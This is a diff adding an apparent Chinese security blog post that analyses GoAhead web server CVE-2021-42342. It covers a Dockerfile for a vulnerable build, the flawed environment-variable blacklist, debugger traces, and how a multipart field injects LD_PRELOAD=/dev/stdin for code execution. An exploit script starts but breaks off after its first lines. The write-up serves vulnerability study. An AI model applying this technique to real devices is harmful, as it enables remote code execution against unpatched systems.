@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="GoAhead Web Server是为嵌入式实时操作系统定制的开源Web服务器。IBM、HP、Oracle、波音、D-link、摩托罗拉等厂商都曾在其产品中使用过GoAhead。官方文档 base影响版本Commit:commit 漏洞类型未校验数据or校验可绕过导致最终执行execve函数的envp参数可控 利用方法方法一：发送构造好的恶意payload去控制envp，在最终执行execve时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GoAhead漏洞分析">
+<meta property="og:url" content="http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Nepire Blog">
+<meta property="og:description" content="GoAhead Web Server是为嵌入式实时操作系统定制的开源Web服务器。IBM、HP、Oracle、波音、D-link、摩托罗拉等厂商都曾在其产品中使用过GoAhead。官方文档 base影响版本Commit:commit 漏洞类型未校验数据or校验可绕过导致最终执行execve函数的envp参数可控 利用方法方法一：发送构造好的恶意payload去控制envp，在最终执行execve时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4b7ebc8862f0e9318e72a56654ab0e336a133a032f44d3fcb0fcf7fd1cef7918.png">
+<meta property="og:image" content="http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/07b5da656cbc169e6d93e1f2bafe5dd019aa8e88a09e6b79e3b763af4e88d464.png">
+<meta property="og:image" content="http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/e1e360da26e05542fff670448281de473440e64d0e99b8a4ca61bb5e67030379.png">
+<meta property="og:image" content="http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/bd8ed6bdc3d519d8e8c60328b9c78e8ac68923cbcf9cc16611ed1d6f98230e6e.png">
+<meta property="article:published_time" content="2023-10-08T06:56:53.000Z">
+<meta property="article:modified_time" content="2023-10-10T10:27:11.909Z">
+<meta property="article:author" content="nepire">
+<meta property="article:tag" content="CVE-2021-42342,环境变量注入,RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4b7ebc8862f0e9318e72a56654ab0e336a133a032f44d3fcb0fcf7fd1cef7918.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>GoAhead漏洞分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/10/RealWorldCTF-DCS-960L%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/08/MiRouter%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=GoAhead漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=GoAhead漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GoAhead漏洞分析&body=Check out this article: http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=GoAhead漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=GoAhead漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#base"><span class="toc-number">1.</span> <span class="toc-text">base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">利用手法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">脚本</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        GoAhead漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">nepire</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-08T06:56:53.000Z" class="dt-published" itemprop="datePublished">2023-10-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CVE-2021-42342-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5-RCE/" rel="tag">CVE-2021-42342,环境变量注入,RCE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://github.com/embedthis/goahead">GoAhead Web Server</a>是为嵌入式实时操作系统定制的开源Web服务器。IBM、HP、Oracle、波音、D-link、摩托罗拉等厂商都曾在其产品中使用过GoAhead。<br><a target="_blank" rel="noopener" href="https://www.embedthis.com/goahead/doc/">官方文档</a></p>
+<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p><strong>影响版本</strong><br>Commit:<a target="_blank" rel="noopener" href="https://github.com/embedthis/goahead/commit/22adfec8568af2c22d4c96cab27ee26b806e3f90">commit</a></p>
+<p><strong>漏洞类型</strong><br>未校验数据or校验可绕过导致最终执行execve函数的envp参数可控</p>
+<p><strong>利用方法</strong><br>方法一：发送构造好的恶意payload去控制envp，在最终执行execve时控制环境变量等效于LD_PRELOAD&#x3D;eval.so来执行任意代码<br>方法二：和@Swing<a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2021-42342-Goahead.html#%E6%89%BE%E4%B8%8D%E5%88%B0%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6-%E7%9A%84%E9%97%AE%E9%A2%98%E8%A1%A5%E5%85%85">讨论了一下</a>他用的方法,发现与我使用的方法属于两种利用，具体用法移步他的博客，这里我就不多赘述了</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -a /etc/apt/sources.list /etc/apt/sources.list.bak</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s@http://.*archive.ubuntu.com@http://repo.huaweicloud.com@g&quot;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">&amp;&amp;  sed -i <span class="string">&quot;s@http://.*security.ubuntu.com@http://repo.huaweicloud.com@g&quot;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; apt-get upgrade</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git gcc make</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/embedthis/goahead.git</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/goahead/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git checkout 649285c</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> make</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/goahead/test/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc ./cgitest.c -o cgi-bin/cgitest</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/var/www/goahead/build/linux-x64-default/bin/goahead&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a target="_blank" rel="noopener" href="https://github.com/embedthis/goahead/blob/649285ccf3e96e9393b327ed8c496f1d5f6109c7/src/cgi.c#L163">commit code</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>, s = hashFirst(wp-&gt;vars); s != <span class="literal">NULL</span>; s = hashNext(wp-&gt;vars, s)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;content.valid &amp;&amp; s-&gt;content.type == <span class="built_in">string</span>) &#123;</span><br><span class="line">        vp = strim(s-&gt;name.value.<span class="built_in">string</span>, <span class="number">0</span>, WEBS_TRIM_START);<span class="comment">//this</span></span><br><span class="line">        <span class="keyword">if</span> (smatch(vp, <span class="string">&quot;REMOTE_HOST&quot;</span>) || smatch(vp, <span class="string">&quot;HTTP_AUTHORIZATION&quot;</span>) ||</span><br><span class="line">            smatch(vp, <span class="string">&quot;IFS&quot;</span>) || smatch(vp, <span class="string">&quot;CDPATH&quot;</span>) ||</span><br><span class="line">            smatch(vp, <span class="string">&quot;PATH&quot;</span>) || sstarts(vp, <span class="string">&quot;LD_&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;arg != <span class="number">0</span> &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            envp[n++] = sfmt(<span class="string">&quot;%s%s=%s&quot;</span>, ME_GOAHEAD_CGI_VAR_PREFIX, s-&gt;name.value.<span class="built_in">string</span>,</span><br><span class="line">                s-&gt;content.value.<span class="built_in">string</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            envp[n++] = sfmt(<span class="string">&quot;%s=%s&quot;</span>, s-&gt;name.value.<span class="built_in">string</span>, s-&gt;content.value.<span class="built_in">string</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        trace(<span class="number">0</span>, <span class="string">&quot;Env[%d] %s&quot;</span>, n, envp[n<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (n &gt;= envpsize) &#123;</span><br><span class="line">            envpsize *= <span class="number">2</span>;</span><br><span class="line">            envp = wrealloc(envp, envpsize * <span class="keyword">sizeof</span>(<span class="type">char</span> *));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我认为这个漏洞属于作者在修补好CVE-2017-17562后<a target="_blank" rel="noopener" href="https://github.com/embedthis/goahead/commit/6f786c123196eb622625a920d54048629a7caa74">commit</a>在优化代码时<a target="_blank" rel="noopener" href="https://github.com/embedthis/goahead/commit/22adfec8568af2c22d4c96cab27ee26b806e3f90">commit</a>再次破坏了自己的黑名单机制，strim函数具体实现于<br><a target="_blank" rel="noopener" href="https://github.com/embedthis/goahead/blob/649285ccf3e96e9393b327ed8c496f1d5f6109c7/src/runtime.c#L2734">https://github.com/embedthis/goahead/blob/649285ccf3e96e9393b327ed8c496f1d5f6109c7/src/runtime.c#L2734</a><br>由于第二个参数为0，所以返回的vp会永远为0，所以下一步的黑名单检测会全部失效<br>然后通过下方envp[n++] &#x3D; sfmt(“%s&#x3D;%s”, s-&gt;name.value.string, s-&gt;content.value.string);将解析后的数据存入env数组<br>接着就是设置stdIn与stdOut进入launchCgi函数，调试可知stdIn与stdOut是两个io文件的路径<br>launchCgi将传入的stdIn与stdOut通过dup2重定向<br>然后执行execve(cgiPath, argp, envp)，其中envp内容我们可控，使得我们可以构造等价于以下语句的执行效果<br>LD_PRELOAD&#x3D;eval.so .&#x2F;goahead</p>
+<h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><p>发送构造好的恶意payload去控制envp，在最终执行execve时控制环境变量等效于LD_PRELOAD&#x3D;eval.so来执行任意代码</p>
+<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p>首先确定目标是从readEvent()接收请求后，中间经过一系列的处理解析最终执行execve时控制环境变量存在LD_PRELOAD&#x3D;eval.so来执行任意代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">0</span>  execve () at ../sysdeps/unix/syscall-template.S:<span class="number">78</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007ffff7f1f692</span> in <span class="title function_">launchCgi</span> <span class="params">(cgiPath=<span class="number">0x55555556b110</span> <span class="string">&quot;/home/ubuntu/docker-server/gohead_eval/goahead/test/cgi-bin/cgitest&quot;</span>, argp=<span class="number">0x55555556b440</span>, envp=<span class="number">0x55555556b4c0</span>, stdIn=<span class="number">0x55555555cc20</span> <span class="string">&quot;/tmp/cgi-0.tmp&quot;</span>, stdOut=<span class="number">0x55555556d5a0</span> <span class="string">&quot;/tmp/cgi-1.tmp&quot;</span>)</span> at src/cgi.c:586</span><br><span class="line">#2  0x00007ffff7f1e9df in <span class="title function_">cgiHandler</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/cgi.c:216</span><br><span class="line">#3  0x00007ffff7f31053 in <span class="title function_">websRunRequest</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/route.c:182</span><br><span class="line">#4  0x00007ffff7f23f05 in <span class="title function_">websPump</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:870</span><br><span class="line">#5  0x00007ffff7f23d8d in <span class="title function_">readEvent</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:834</span><br><span class="line">#6  0x00007ffff7f23b0e in <span class="title function_">socketEvent</span> <span class="params">(sid=<span class="number">1</span>, mask=<span class="number">2</span>, wptr=<span class="number">0x555555565f40</span>)</span> at src/http.c:772</span><br><span class="line">#7  0x00007ffff7f39b05 in <span class="title function_">socketDoEvent</span> <span class="params">(sp=<span class="number">0x555555565e00</span>)</span> at src/socket.c:654</span><br><span class="line">#8  0x00007ffff7f39a26 in <span class="title function_">socketProcess</span> <span class="params">()</span> at src/socket.c:628</span><br><span class="line">#9  0x00007ffff7f258e7 in <span class="title function_">websServiceEvents</span> <span class="params">(finished=<span class="number">0x555555558014</span> &lt;finished&gt;)</span> at src/http.c:1385</span><br><span class="line">#10 0x00005555555559d2 in <span class="title function_">main</span> <span class="params">(argc=<span class="number">5</span>, argv=<span class="number">0x7fffffffdf78</span>, envp=<span class="number">0x7fffffffdfa8</span>)</span> at src/goahead.c:170</span><br></pre></td></tr></table></figure>
+<p>于是可以从接收数据到解析数据到最终触发execve路径中的函数进行审计<br>envp由s-&gt;name.value.string，s-&gt;content.value.string格式化生成，其中s由wp结构体中的var来从hash链表中取出<br>由以下调用链可得知是在websPump调用对应parse函数后通过websSetVar对链表节点的参数进行赋值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">0</span>  hashEnter (sd=<span class="number">21845</span>, name=<span class="number">0x0</span>, v=..., arg=<span class="number">1431729616</span>) at src/runtime.c:<span class="number">2073</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007ffff7f261b2</span> in <span class="title function_">websSetVar</span> <span class="params">(wp=<span class="number">0x555555565f40</span>, var=<span class="number">0x55555556a460</span> <span class="string">&quot;LD_PRELOAD&quot;</span>, value=<span class="number">0x5555555675d0</span> <span class="string">&quot;/dev/stdin&quot;</span>)</span> at src/http.c:1535</span><br><span class="line">#2  0x00007ffff7f3d0b3 in <span class="title function_">processContentData</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/upload.c:383</span><br><span class="line">#3  0x00007ffff7f3c4fd in <span class="title function_">websProcessUploadData</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/upload.c:145</span><br><span class="line">#4  0x00007ffff7f25181 in <span class="title function_">processContent</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:1216</span><br><span class="line">#5  0x00007ffff7f23ef4 in <span class="title function_">websPump</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:867</span><br><span class="line">#6  0x00007ffff7f23d8d in <span class="title function_">readEvent</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:834</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4b7ebc8862f0e9318e72a56654ab0e336a133a032f44d3fcb0fcf7fd1cef7918.png"></p>
+<p>其中parseIncoming处理请求头，processContent处理post数据<br>processContent存在以下几种处理类型<br><img src="/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/07b5da656cbc169e6d93e1f2bafe5dd019aa8e88a09e6b79e3b763af4e88d464.png"></p>
+<p>websProcessUploadData处理post上传数据的内部流程如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">initUpload()</span><br><span class="line"><span class="comment">/*set UPLOAD_BOUNDARY*/</span></span><br><span class="line"><span class="comment">/* ret start idx */</span></span><br><span class="line"></span><br><span class="line">processContentBoundary()</span><br><span class="line"><span class="comment">/* set UPLOAD_CONTENT_HEADER */</span></span><br><span class="line"></span><br><span class="line">processUploadHeader(wp,line)</span><br><span class="line"><span class="comment">/*line = Content-Disposition: form-data; name=\&quot;LD_PRELOAD\&quot; */</span></span><br><span class="line"><span class="comment">/* wp-&gt;uploadVar = LD_PRELOAD  */</span></span><br><span class="line"></span><br><span class="line">processUploadHeader(wp,<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line"><span class="comment">/* set wp-&gt;uploadState = UPLOAD_CONTENT_DATA */</span></span><br><span class="line"></span><br><span class="line">processContentData(wp)</span><br><span class="line"><span class="comment">/* set nameVar */</span></span><br><span class="line"><span class="comment">/* set wp-&gt;uploadState = UPLOAD_BOUNDARY */</span></span><br><span class="line"></span><br><span class="line">processContentBoundary(wp,line)</span><br><span class="line"><span class="comment">/* strcmp(&amp;line[wp-&gt;boundaryLen], &quot;--&quot;) */</span></span><br><span class="line"><span class="comment">/* set wp-&gt;uploadState = UPLOAD_CONTENT_END */</span></span><br></pre></td></tr></table></figure>
+<p>这时通过构造form-data格式的数据已经将s-&gt;name赋值为LD_PRELOAD，s-&gt;content为&#x2F;dev&#x2F;stdin<br>并且在最后bufCompact函数将wp-&gt;input.servp移动到%s–后，那么在之后后进入websProcessCgiData时，便会将发送的报文%s–后所构造的数据写入wp-&gt;cgifd所指向的文件<br>接着返回processContent函数的判断语句，进入websProcessCgiData函数，将wp-&gt;input.servp写入stdin的文件里，简单的调试如下<br><img src="/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/e1e360da26e05542fff670448281de473440e64d0e99b8a4ca61bb5e67030379.png"></p>
+<p><img src="/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/bd8ed6bdc3d519d8e8c60328b9c78e8ac68923cbcf9cc16611ed1d6f98230e6e.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">0</span>  websProcessCgiData (wp=<span class="number">0x555555565f40</span>) at src/cgi.c:<span class="number">264</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007ffff7f251fa</span> in <span class="title function_">processContent</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:1232</span><br><span class="line">#2  0x00007ffff7f23ef4 in <span class="title function_">websPump</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:867</span><br><span class="line">#3  0x00007ffff7f23d8d in <span class="title function_">readEvent</span> <span class="params">(wp=<span class="number">0x555555565f40</span>)</span> at src/http.c:834</span><br></pre></td></tr></table></figure>
+<p>由此可见已经成功将so库写入目标文件，并且可以通过&#x2F;dev&#x2F;stdin或&#x2F;proc&#x2F;self&#x2F;fd&#x2F;0，这固定链接文件去指向所写的文件<br>所以最终执行到execve(cgiPath, argp, envp)时，envp中的一项已经被我们所控制为LD_PRELOAD&#x3D;&#x2F;dev&#x2F;stdin，也就是加载我们所写入的so文件，从而做到任意代码执行</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#target_mesg</span></span><br><span 